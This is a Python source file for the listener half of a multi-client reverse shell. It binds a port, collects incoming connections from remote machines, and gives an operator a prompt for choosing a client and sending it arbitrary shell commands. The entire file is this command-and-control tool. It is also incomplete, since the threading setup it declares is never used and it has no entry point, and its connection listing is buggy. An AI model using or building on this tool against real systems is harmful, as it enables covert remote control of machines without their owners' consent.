import socket
import threading 
import time
from queue import Queue
import sys
import os,signal


PORT=9990
HOST=""
MAX_BAD_CONNECTIONS=5
NUMBER_OF_THREADS=2
TASKS=[1,2]            

#defining prerequisites for multithreading
queue=Queue()
connections=[]
addresses=[]


def shell_decoration():
	print("\t\t----------------------------")
	print("\n\n\t\t||WELCOME TO CUSTOM SHELL||")
	print("\t\tEnter lst for list of commands..\n\n")
	print("\t\t----------------------------")


def display_list_of_commands():
	print("\tYou can type in the following commands : ")
	print("\t1. clients : displays the currently active clients")
	print("\t2. choose : type 'choose' followed by client ID to start connection")


#Creating a socket to establish communication
def create_socket():
	global PORT 
	global HOST
	global s
	try:
		s=socket.socket()
	except socket.error as msg:
		print("Socket creation error : "+str(msg))



#Binding the socket to the port
def bind_socket():
	global PORT
	global HOST
	global s
	global MAX_BAD_CONNECTIONS

	try:
		s.bind((HOST,PORT))
		print("Port binding successful.. Listening...")
		s.listen(MAX_BAD_CONNECTIONS)      #MAX_BAD_CONNECTIONS is the total number of bad connnections tolerated 

	except socket.error as msg:
		print("Socket binding error : "+str(msg))
		print("Port binding not successful.")

		#Retrying the binding process..
		bind_socket()


#Accept client information
def accept_client_connection():
    for connection in connections:
        connection.close()

    del connections[:]
    del addresses[:]

    while True:
        try:
            connection, address = s.accept()
            s.setblocking(1)  

            connections.append(connection)
            addresses.append(address)

            print("Connection has been established : " + address[0])

        except:
            print("Failed to establish connection..")




#Creating custom shell
def start_myShell():
	time.sleep(0.05)
	shell_decoration()
	time.sleep(0.01)

	while True:

		shell_command=input('myShell> ')


		if shell_command=="clients":
			list_of_connections()

		elif "choose" in shell_command:
			new_connection=get_client(shell_command)
			if new_connection:
				send_commands(new_connection)

		elif shell_command=='' or shell_command=='\n' or shell_command=='quit':
			continue

		elif shell_command=='lst':
			display_list_of_commands()

		elif shell_command=='exit':
			print("exiting..")
			time.sleep(0.5)
			pid = os.getpid()
			os.kill(pid, signal.SIGTERM)
			
		else:
			print("Invalid command entered!")



#List all currently active connections
def list_of_connections():
	results=''
	BUFFER_SIZE=999999

	for ID,connection in enumerate(connections):
		try: #Check whether connection is active
			testing_data=str.encode("test")
			connection.send(testing_data)
			connection.recv(BUFFER_SIZE)
		except:
			del connections[ID]
			del addresses[ID]
			continue

		results=str(ID)+".   "+str(addresses[ID][0])+ "   "+str(addresses[ID][1])+"\n"

	if not results:
		results="     NO ACTIVE CLIENTS\n\n"

	print("\n\n|----------CLIENTS----------|\n"+results)




def get_client(shell_command):
	try:
		client_ID=shell_command.replace('choose ','')
		client_ID=int(client_ID)
		IP=str(addresses[client_ID][0])

		connection=connections[client_ID]

		print_statement="successfully connected to client {} with IP address : {}"
		print(print_statement.format(client_ID,IP))
		print(IP+"> ",end="")

		return connection

	except:
		print("Invalid command!")
		return None




#Sending commands to the client machine
def send_commands(connection):
	BUFFER_SIZE=999999
	while True:
		try:
			terminal_input=input()

			#Command for closing connection 
			if terminal_input=="quit":
				break

			#Convert string to bytes
			command=str.encode(terminal_input)

			if len(command)>0:
				#sending command as a stream of bytes to client machine 
				connection.send(command)
				#recieving client response in byte format and converting it to string 
				client_response=str(connection.recv(BUFFER_SIZE),"utf-8")

				print(client_response,end="")

		except:
			print("Command not sent! Error occured")
			print("Connection failed! Exiting...")
			time.sleep(1)
			break


